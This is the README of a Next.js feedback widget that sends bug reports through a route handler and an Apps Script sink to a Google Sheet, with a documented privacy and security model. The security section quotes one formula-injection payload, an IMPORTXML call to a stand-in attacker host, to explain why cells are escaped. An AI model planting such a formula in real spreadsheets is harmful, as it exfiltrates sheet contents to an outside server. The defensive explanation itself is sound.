# @unhyped/feedback

An in-page feedback widget for Next.js. Someone reviewing your site clicks a
button, types what broke and why it matters, and the report lands in a Google
Sheet with the browser context already attached.

No database. No third-party SaaS. No cookie banner — nothing is stored on the
client except a draft and an anonymous per-tab id, and the IP address is never
written down.

It exists to replace the WhatsApp message that says *"the pricing page is
broken"* with a row that says which page, which browser, which viewport, and
what the console was throwing at the time.

```
browser — shadow DOM, second React root
   │
   │  POST /api/feedback
   │  { schemaVersion, project, type, severity, what, why, how, context }
   ▼
Next.js route handler
   │  honeypot · rate limit · validate · re-derive UA from raw · redact query values
   │  injects: token · environment · country · commit SHA
   │
   │  POST (redirect: follow — Apps Script answers 302)
   ▼
Apps Script /exec
   │  token check · validate · LockService · escape leading =+-@ · redact query values
   │  appendRow, mapped by header NAME
   ▼
Google Sheet
   reports  ──(one QUERY formula)──▶  board   ← the tab you share with the client
```

## Install

```bash
npm i github:marcin-laskowski/feedback#v0.1.0
```

The package ships TypeScript source and is compiled by the host app:

```js
// next.config.ts
transpilePackages: ["@unhyped/feedback"]
```

## Use

```tsx
// app/layout.tsx
import { FeedbackErrorInit, FeedbackWidget } from "@unhyped/feedback/client";

<FeedbackErrorInit />
<FeedbackWidget
  project="acme-website"
  enabled={process.env.NEXT_PUBLIC_FEEDBACK === "on"}
  reveal="invited"
/>
```

```ts
// app/api/feedback/route.ts
export { POST, GET } from "@unhyped/feedback/server";
export const maxDuration = 20; // route segment config must live in the route file
```

`<FeedbackErrorInit />` goes in the layout, above everything else. It starts the
console-error buffer, which has to be listening *before* the errors happen — a
buffer that starts when the panel opens only ever captures the errors that came
after the user noticed the bug.

### Props

| Prop | Default | What it does |
|---|---|---|
| `project` | required | Written to the `project` column. One value per site. |
| `enabled` | `true` | Build-time kill switch. Off means nothing mounts. |
| `reveal` | `"always"` | `"always"` shows the trigger to everyone. `"invited"` hides it until someone arrives on `?feedback=open`, then remembers it in `localStorage`. |
| `endpoint` | `/api/feedback` | Where the route handler is mounted. |

`reveal="invited"` is the setting for a live site whose visitors are customers
rather than reporters: you paste `https://example.com/pricing?feedback=open`
into the message, and the widget appears for the person who followed the link
and for nobody else.

## Environment

Two variables, both server-side only:

```bash
FEEDBACK_SINK_URL=https://script.google.com/macros/s/AKfy…/exec
FEEDBACK_SINK_TOKEN=…
```

Neither may ever reach the browser, which is why the warm-up ping is a `GET` on
your own route rather than a fetch straight at the sink — the widget cannot know
the sink's address.

Setting up the sink takes about 30 minutes and is documented in
[`apps-script/README.md`](apps-script/README.md). Nothing else works until a
`curl` command appends a row.

## What ends up in the sheet

32 columns, in a fixed order. The report itself (`type`, `severity`, `what`,
`why`, `how`), the page (`page_path`, `page_url`, `page_title`), the environment
(`viewport`, `screen`, `browser`, `os`, `device`, `color_scheme`, `language`,
`timezone`, `country`), the session (`session_id`, `time_on_page_s`,
`pages_visited`, `console_errors`), and two columns you fill in by hand
(`status`, `notes`).

Two things about that sheet are load-bearing:

- **Rows are written by header NAME, not by column index.** Reordering columns
  is safe. *Renaming* a header silently empties that column for every future
  report — protect the `reports` tab and put human-readable labels in the
  `board` view instead.
- **Every text cell is escaped** if it starts with `=`, `+`, `-`, `@`, or a
  control character. A report containing `=IMPORTXML("https://evil.tld","//a")`
  would otherwise exfiltrate the sheet the moment somebody opened it.

## Privacy and security model

- The endpoint is protected by a **shared secret, not by obscurity.** Publishing
  `Code.gs` costs nothing; publishing the token would cost everything. It lives
  in Apps Script Script Properties and in your host's environment, never in git.
- **The query string is never rendered** in the widget's context strip — a URL
  can be `/reset-password?token=eyJ…`, and the strip is on screen next to
  whoever is standing behind the reporter.
- **Query values on a denylist are redacted** (`token`, `key`, `secret`,
  `password`, `pwd`, `code`, `email`, `session`, `auth`, `signature`,
  `access_token`, `id_token`) in two places: the route handler, so the value
  never reaches Google, and the sink, so it never reaches the sheet. The param
  *names* survive, so the report stays diagnosable.
- **No IP address is stored.** The country code comes from the CDN header; the
  address it was derived from is not written anywhere.
- **The user-agent parse is re-derived server-side** from the raw string. The
  client's parse is what it rendered, not what gets stored.
- The draft lives in `sessionStorage`, keyed by pathname, and dies with the tab.

## Accepted limits

| Limit | Why it is fine |
|---|---|
| No rate limiting in the sink | The route handler limits per IP, plus a honeypot. The sink is not public — only your server knows its address. |
| No idempotency | Submit is synchronous with no auto-retry, and `redirect: "follow"` removes the duplicate-row cause. |
| No `schemaVersion` negotiation | The field is stored; nothing branches on it yet. |
| Cold start 1–3 s | The warm-up ping on panel open covers it. |
| In-memory rate limit | Per serverless instance, best-effort. Fine for a tool with three reporters. |

## Layout

```
src/
├── shared/    contract compiled by both sides: types · validate · ua · redact · strings
├── server/    route handler (POST + warm-up GET)
└── client/    shadow-DOM mount, panel, context strip, draft, deep link
apps-script/   the sink: Code.gs, appsscript.json, setup guide
```

`shared/` is the reason the client and the server agree on what a valid report
is. Validation runs in both — in the browser so the reporter gets a highlighted
field, on the server so a crafted request cannot skip it.

## Development

```bash
npm install
npm run typecheck
```

There is no build step. Next compiles the source through `transpilePackages`.

## Licence

MIT — see [LICENSE](LICENSE).
